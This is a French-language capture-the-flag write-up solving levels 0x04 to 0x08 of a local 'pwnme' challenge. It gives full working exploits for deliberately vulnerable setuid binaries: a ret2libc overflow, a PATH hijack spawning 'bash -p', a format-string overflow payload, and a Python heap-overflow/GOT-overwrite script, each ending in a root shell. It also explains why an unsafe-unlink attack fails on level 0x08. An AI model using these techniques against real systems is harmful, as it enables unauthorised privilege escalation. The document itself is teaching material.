AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAo|"�
Segmentation fault
tux@tux:~/0x04$ dmesg | tail -1
[273867.824116] pwnme[30552]: segfault at 41414141 ip 41414141 sp bffff710 error 14
```

On peut reproduire avec `gdb` et regarder la stack au moment du crash :

```shellsession
tux@tux:~/0x04$ gdb -q ./pwnme 
Reading symbols from ./pwnme...(no debugging symbols found)...done.
(gdb) r input
Starting program: /home/tux/0x04/pwnme input
Good.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAo|"�

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e643e0 <__libc_system>
(gdb) x/4wx $esp
0xbffff6e0:     0x0804a008      0x0804866f      0x0804987c      0x08048622
(gdb) x/s 0x0804866f
0x804866f:      "r"
```

On voit qu'un pointeur vers le caractère `r` est présent (hasard total). Si on écrase l'adresse de retour par celle de `system()` le programme va alors exécuter `r`. On peut faire en sorte qu'il y ait un programme de ce nom dans le PATH :

```shellsession
tux@tux:~/0x04$ cp `which id` r
tux@tux:~/0x04$ export PATH=.:$PATH
tux@tux:~/0x04$ python -c 'import sys; import struct; sys.stdout.write("!!" + "A" * 1036 + struct.pack("<I", 0xb7e643e0))' > input
tux@tux:~/0x04$ ./pwnme input 
Good.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�C�o|"�
uid=1000(tux) gid=1000(tux) euid=0(root) groups=1000(tux),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
Segmentation fault
```

## Level 0x05

On est dans un cas des plus simples. Assez étrange étant donné tout ce que l'on a résolu jusqu'à présent :

```c
// gcc pwnme.c -o pwnme
#include <stdio.h>

int main( void ) {
        puts("Content of /home/tux:");
        system("ls -l /home/tux");

        return 0;
}
```

Il suffit d'agir sur le PATH :

```shellsession
tux@tux:~/0x05$ echo -e '#!/bin/sh\nbash -p' > ls
tux@tux:~/0x05$ chmod 755 ls
tux@tux:~/0x05$ export PATH=.:$PATH
tux@tux:~/0x05$ ./pwnme 
Content of /home/tux:
bash-4.3# id
uid=1000(tux) gid=1000(tux) euid=0(root) groups=1000(tux),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

## Level 0x06

On a une faille de format string mais pas uniquement puisque la destination du `sprintf` est sur la stack :

```c
// gcc -fno-stack-protector pwnme.c -o pwnme
#include <stdio.h>
#include <string.h>
int dummy(const char * data) {
        char buff[64];
        if(strlen(data) > 64)
                puts("Bad dog!");
        else {
        sprintf(buff, data);
        puts(buff);

        }

        return 0;
}

int main(int argc, char **argv) {
        dummy(argv[1]);
        return 0;
}
```

Le code ne lit que 64 octets mais avec une bonne chaine de format on peut faire déborder `buff` et provoquer un stack overflow. Il nous suffira de reprendre les adresses de `system` et `/bin/sh` comme précédemment :

```shellsession
tux@tux:~/0x06$ ./pwnme '%64xAAAABBBBCCCCDDDD'
                                                         2c0003fAAAABBBBCCCCDDDD
Segmentation fault
tux@tux:~/0x06$ dmesg | tail -1
[274963.809235] pwnme[991]: segfault at 44444444 ip 44444444 sp bffff710 error 14
tux@tux:~/0x06$ ./pwnme `python -c 'print "%64xAAAABBBBCCCC\xe0\x43\xe6\xb7" + "\x69\x5a\xf8\xb7"*2'`
                                                         2c0003fAAAABBBBCCCC�C��iZ��iZ��
# id
uid=1000(tux) gid=1000(tux) euid=0(root) groups=1000(tux),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

## Level 0x07

On est sur un cas de heap overflow où l'on doit écraser des pointeurs laissés par l'auteur du code :

```c
// gcc -fno-stack-protector pwnme.c -o pwnme
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct member {
        int id;
        char *name;
} member;

void main(int argc, char **argv)
{
        struct member *m1, *m2, *m3;

        m1 = malloc(sizeof(struct member));
        m1->id = 1;
        m1->name = malloc(8);

        m2 = malloc(sizeof(struct member));
        m2->id = 2;
        m2->name = malloc(8);

        strcpy(m1->name, argv[1]);
        strcpy(m2->name, argv[2]);

        exit(0);
}
```

En mémoire 20 octets séparent le premier nom du second nom.

Je met aussi un boût du dump assembleur du `main()` car ce sera utile pour la compréhension de l'exploitation :

```nasm
(gdb) x/30i 0x080484b9
   0x80484b9 <main+94>: push   $0x8
   0x80484bb <main+96>: call   0x8048320 <malloc@plt>
   0x80484c0 <main+101>:        add    $0x10,%esp
   0x80484c3 <main+104>:        mov    %eax,%edx
   0x80484c5 <main+106>:        mov    -0x10(%ebp),%eax
   0x80484c8 <main+109>:        mov    %edx,0x4(%eax)
   0x80484cb <main+112>:        mov    0x4(%ebx),%eax
   0x80484ce <main+115>:        add    $0x4,%eax
   0x80484d1 <main+118>:        mov    (%eax),%edx
   0x80484d3 <main+120>:        mov    -0xc(%ebp),%eax
   0x80484d6 <main+123>:        mov    0x4(%eax),%eax
   0x80484d9 <main+126>:        sub    $0x8,%esp
   0x80484dc <main+129>:        push   %edx
   0x80484dd <main+130>:        push   %eax
   0x80484de <main+131>:        call   0x8048310 <strcpy@plt>
   0x80484e3 <main+136>:        add    $0x10,%esp
   0x80484e6 <main+139>:        mov    0x4(%ebx),%eax
   0x80484e9 <main+142>:        add    $0x8,%eax
   0x80484ec <main+145>:        mov    (%eax),%edx
   0x80484ee <main+147>:        mov    -0x10(%ebp),%eax
   0x80484f1 <main+150>:        mov    0x4(%eax),%eax
   0x80484f4 <main+153>:        sub    $0x8,%esp
   0x80484f7 <main+156>:        push   %edx
   0x80484f8 <main+157>:        push   %eax
   0x80484f9 <main+158>:        call   0x8048310 <strcpy@plt>
   0x80484fe <main+163>:        add    $0x10,%esp
   0x8048501 <main+166>:        sub    $0xc,%esp
   0x8048504 <main+169>:        push   $0x0
   0x8048506 <main+171>:        call   0x8048340 <exit@plt>
   0x804850b:   xchg   %ax,%ax
```

On devine qu'avec le premier `strcpy` on peut déborder et écraser `m2->name` qui est utilisé plus tard pour un `strcpy`. On a donc une situation `write-what-where` (écrire ce que l'on souhaite où l'on souhaite).

Toutefois on ne peux écraser qu'un seul bloc contigu de données. Ecraser `exit()` par `system()` n'a pas d'intérets car on ne contrôle pas l'argument qui est poussé sur la stack.

Tout va se jouer sur les offsets des différents symboles de la GOT :

```shellsession
(gdb) x/i strcpy
   0x8048310 <strcpy@plt>:      jmp    *0x8049788
(gdb) x/wx 0x8049788
0x8049788 <strcpy@got.plt>:     0x08048316
(gdb) 
0x804978c <malloc@got.plt>:     0x08048326
(gdb) 
0x8049790 <__gmon_start__@got.plt>:     0x08048336
(gdb) 
0x8049794 <exit@got.plt>:       0x08048346
(gdb) 
0x8049798 <__libc_start_main@got.plt>:  0x08048356
```

Avec une seule écriture on peut donc écraser à la fois l'adresse de `strcpy` et cette de `exit`.

On va faire en sorte que `exit` remonte l'exécution dans le main (à l'adresse `0x080484c5`, voir dump assembleur) où il pourra appeller à nouveau `strcpy` qui aura entre temps été remplacé par `system`.

Lors de ce second appel, `system` est appelé avec la chaine passée via `argv[1]`. On va donc y placer notre commande plutôt qu'un simple padding.

Exploit :

```python
import os
from struct import pack

strcpy_got_plt = 0x8049788
system = 0xb7e643e0
main_strcpy = 0x080484c5

arg1 = "/bin/sh;"
arg1 += "#" * (20 - len(arg1))
arg1 += pack("<I", strcpy_got_plt)

arg2 = pack("<I", system)
arg2 += pack("<I", 0xdeadbeef) * 2
arg2 += pack("<I", main_strcpy)

os.execve("./pwnme", ["./pwnme", arg1, arg2], os.environ)
```

```shellsession
tux@tux:~/0x07$ python exploit.py 
# id
uid=1000(tux) gid=1000(tux) euid=0(root) groups=1000(tux),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

## Level 0x08

On a ce code source qui rappelle très fortement le [heap3 de protostar](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Protostar%20(heap).md#level-3) :

```c
// gcc -fno-stack-protector pwnme.c -o pwnme
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void main(int argc, char **argv) {
        char *p1, *p2;

        p1 = malloc(64);
        p2 = malloc(64);

        strcpy(p1, argv[1]);

        free(p2);
        free(p1);

        exit(0);
}
```

La différence est toutefois de taille car ici le binaire est linké et que la libc présente sur le système est la 2.19 or l'allocateur est `ptmalloc2` depuis le libc 2.3.

`ptmalloc` est une version plus moderne de `dlmalloc` qui gère mieux les threads mais surtout l'ancienne attaque qui était possible échoue :

```
*** Error in `/home/tux/0x08/pwnme': free(): invalid pointer: 0x0804a050 ***

Program received signal SIGABRT, Aborted.
0xb7fdcd40 in __kernel_vsyscall ()
```

Je ne souhaite pas entrer dans les détails mais depuis une vérification a été ajoutée qui s'assure que les pointeurs FD et BK des chunks libérés suivant et précédents ramènent bien vers le chunk libéré courant :

```c
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);
```

Sur `how2heap` est documenté la technique [unsafe unlink](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/unsafe_unlink.c) qui bypasse cette restriction. Pour réaliser cet exploit la technique consiste à réutiliser un pointeur existant dans la mémoire du programme et à placer un faux chunk à l'emplacement pointé.

Quand un chunk est alloué, l'adresse du buffer est stockée dans la stack, c'est le pointeur dont l'adresse correspond à la section de données du chunk (adresse retournée par la fonction `malloc()`).

La technique consiste donc à placer le faux chunk directement dans le bloc de données et à s'assurer que les entrées FD et BK du faux chunk remontent un peu avant l'adresse du pointeur (lié au fait que FD et BK sont à des offsets différents dans la structure d'un chunk).

Lors de la libération par l'appel à `free()` le pointeur présent sur la stack est écrasé ce qui fait que si le pointeur est utilisé plus tard (par exemple via `strcpy()`) alors on contrôle où l'on écrit.

Cette méthode est drolement futée mais, comme dans l'exemple de `how2heap`, elle repose sur le fait qu'une écriture soit effectuée sur le premier chunk **après** la libération du chunk 2 ce qui n'est pas le cas ici.

Bref ce level n'est en réalité pas exploitable. Il existe d'autres méthodes documentées sur `how2heap` mais la plupart permettent de faire en sorte que `malloc()` retourne une adresse de notre choix ce qui là encore n'est pas applicable pour nous, la copie se faisant uniquement sur le premier chunk.

*Publié le 12 février 2023*